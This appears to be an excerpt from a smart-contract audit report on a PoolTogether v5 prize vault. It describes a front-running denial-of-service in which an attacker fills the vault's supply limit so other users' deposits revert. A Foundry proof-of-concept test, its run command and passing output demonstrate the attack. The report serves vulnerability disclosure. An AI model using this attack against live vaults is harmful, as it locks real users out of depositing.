...
Once the `TWAB_SUPPLY_LIMIT` is reached, all deposit attempts will revert due to the `_enforceMintLimit()` in `_depositAndMint`.

1. A prizeVault based on LADYS has minted 50% of the totalSupply
2. A user calls `deposit`
3. An attacker sees (2) in the mempool and front runs it by by depositing the remaining 50% of the totalSupply 
4. When the user's Tx goes through it will revert
5. The attacker can now withdraw his tokens from the vault and he can repeat the process anytime a user tries to deposit into the vault
...
Now add the following `DOSDepositsPOC.sol` to /2024-05-pooltogether/pt-v5-vault/test/integration/DOSDepositsPOC.sol

The following foundry test test__DOSDepositsPOC() illustrates the attack scenario.

Run it with the following command line input

```terminal
forge test --mt test__DOSDepositsPOC
```
...
contract DOSDepositsPOC is Test, BaseIntegration {
    ...
    function test__DOSDepositsPOC() public {
        // This represents multiple users, depositing LADYS over time, such that it accumulates 50% of the totalSupply
        vm.startPrank(alice);
        prizeVault.deposit(39614081257132168796771975167, alice);

        // An honest user bob sends a Tx to deposit into the vault

        // Attacker sees bob's deposit Tx in the mempool and frontruns it by depositing the remaining 50% of the totalSupply
        vm.startPrank(attacker);
        prizeVault.deposit(39614081257132168796771975167, attacker);

        // Bob's Tx finally goes through, but it will revert
        vm.startPrank(bob);
        vm.expectRevert();
        prizeVault.deposit(100000000, bob);

        // The attacker can now withdraw his tokens to repeat the process again whenever any user deposits
        vm.startPrank(attacker);
...
Console output
```terminal
Ran 1 test for test/integration/DOSDepositsPOC.sol:DOSDepositsPOC
[PASS] test__DOSDepositsPOC() (gas: 491008)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.99ms (675.30µs CPU time)
